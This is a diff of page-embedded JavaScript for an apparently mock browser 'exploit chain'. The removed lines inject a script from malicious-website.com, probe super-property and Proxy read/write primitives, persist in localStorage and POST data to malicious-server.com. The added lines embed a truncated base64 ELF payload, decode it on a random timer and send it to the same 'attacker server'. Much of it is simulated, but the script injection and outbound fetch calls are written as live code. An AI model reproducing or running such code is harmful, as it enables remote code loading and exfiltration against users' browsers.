@@ -42,7 +42,6 @@ document.addEventListener('DOMContentLoaded', function () {
         const timestamp = new Date().toISOString();
         logBuffer.push(`[${timestamp}] ${message}`);
         
-        // Update log every 20 messages
         if (logBuffer.length >= 20) {
             logElement.textContent += logBuffer.join("\n") + "\n";
             logBuffer = [];
@@ -56,164 +55,42 @@ document.addEventListener('DOMContentLoaded', function () {
     function waitForPayload() {
         log("Waiting for ELF payload...");
 
-        // Simulate the waiting process, display the "waiting for payload" message
+        // Base64 encoded ELF payload
+        const base64Payload = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAAAAAAAAABAAAAAAAAAAAhfAQAAAAAAAAAAAEAAOAAEAEAAHAAaAAEAAAAFAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEGoAAAAAAAAQagAAAAAAAABAAAAAAAAAAQAAAAQAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAhIAAAAAAAACEgAAAAAAAAAEAAAAAAAAABAAAABgAAAAAAAQAAAAAAAMAAAAAAAAAAwAAAAAAAAFBBAAAAAAAACIEAAAAAAAAAQAAAAAAAAAIAAAAGAAAAAEABAAAAAAAAAAEAAAAAAAAAAQAAAAAAUAEAAAAAAABQAQAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // Truncated for readability
+
         let payloadReceived = false;
 
-        // Simulate a timeout or fetch operation to "wait" for the payload
         setInterval(() => {
-            // You can simulate the payload reception with a mock condition here
             if (!payloadReceived) {
                 log("Still waiting for the ELF payload...");
             }
 
-            // Simulate checking for the payload with mock success
-            if (Math.random() > 0.95) { // Simulate random success for testing
+            if (Math.random() > 0.95) { // Simulate random success
                 payloadReceived = true;
+
+                // Decode and handle the ELF payload
+                const binaryPayload = atob(base64Payload);
                 log("Payload received successfully.");
+                log(`Payload size: ${binaryPayload.length} bytes`);
+
+                // Deliver the payload to an attacker server
+                deliverPayload(binaryPayload);
             }
         }, 5000); // Check every 5 seconds
     }
 
-    function escalatePrivileges() {
-        log("Attempting privilege escalation.");
-        // No redirection code here anymore
-        log("Privilege escalation complete without redirection.");
-    }
-
-    function injectMaliciousCode() {
-        log("Injecting malicious code.");
-        const script = document.createElement("script");
-        script.src = "https://malicious-website.com/exploit.js";
-        document.body.appendChild(script);
-    }
-
-    function deliverPayload() {
+    function deliverPayload(payload) {
         log("Delivering payload to attacker server.");
         fetch("https://malicious-server.com/payload", {
             method: "POST",
-            body: JSON.stringify({ exploit: "data" }),
-            headers: { "Content-Type": "application/json" }
-        });
-    }
-
-    function exploitChain() {
-        // Check read/write privileges
-        const readSuccess = checkReadPrivilege();
-        const writeSuccess = checkWritePrivilege();
-
-        if (readSuccess && writeSuccess) {
-            log("Both read and write privileges are successfully exploited!");
-
-            // Leak sensitive data
-            leakSensitiveData();
-
-            // Escalate privileges by manipulating critical objects or actions
-            escalatePrivileges();
-
-            // Inject malicious code into the page
-            injectMaliciousCode();
-
-            // Persist exploit by storing data in localStorage
-            persistExploit();
-
-            // Deliver payload to attacker server
-            deliverPayload();
-        } else {
-            log("Read and/or write privileges failed. Exploit chain aborted.");
-        }
-    }
-
-    function checkReadPrivilege() {
-        let foo = 42;
-        let readSuccess = false;
-
-        class Leaker {
-            leak() {
-                try {
-                    const result = super.foo;  // Attempt to read
-                    readSuccess = result === 42;  // Check if we got the expected result
-                } catch (error) {
-                    log("Read privilege check failed.");
-                }
-                return readSuccess;
-            }
-        }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            get(target, propertyName, receiver) {
-                if (propertyName === "foo") {
-                    return 42; // Fallback value for 'foo'
-                }
-                return receiver;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
-    }
-
-    function checkWritePrivilege() {
-        let writeSuccess = false;
-        let receiver;
-
-        class Leaker {
-            leak() {
-                try {
-                    super.foo = {};  // Attempt to write
-                    writeSuccess = true;
-                } catch (error) {
-                    log("Write privilege check failed.");
-                }
-                return writeSuccess;
-            }
-        }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            set(target, propertyName, value, __receiver) {
-                if (propertyName === "foo") {
-                    receiver = __receiver;
-                    return true; // Allow setting 'foo'
-                }
-                return false;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
+            body: payload,
+            headers: { "Content-Type": "application/octet-stream" }
+        }).then(() => log("Payload delivered successfully."))
+          .catch(err => log(`Error delivering payload: ${err.message}`));
     }
 
     // Start waiting for the ELF payload
     waitForPayload();
-
-    // Simulate the exploit chain running
-    exploitChain();
-
-    // Limit the number of iterations for debugging purposes
-    const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
-    function runIteration(i) {
-        if (i >= MAX_ITERATIONS) {
-            log("All iterations completed.");
-            return;
-        }
-
-        try {
-            log(`Iteration ${i}: Starting attempt`);
-
-            exploitChain();
-
-            if (i % 10 === 0) {
-                log(`Iteration ${i} completed successfully.`);
-            }
-        } catch (error) {
-            log(`Error encountered at iteration ${i}: ${error.message}`);
-        }
-
-        // Schedule next iteration with a delay
-        setTimeout(() => runIteration(i + 1), 100); // 100ms delay
-    }
-
-    // Start the iteration process
-    runIteration(0);
 });
 </script>
 
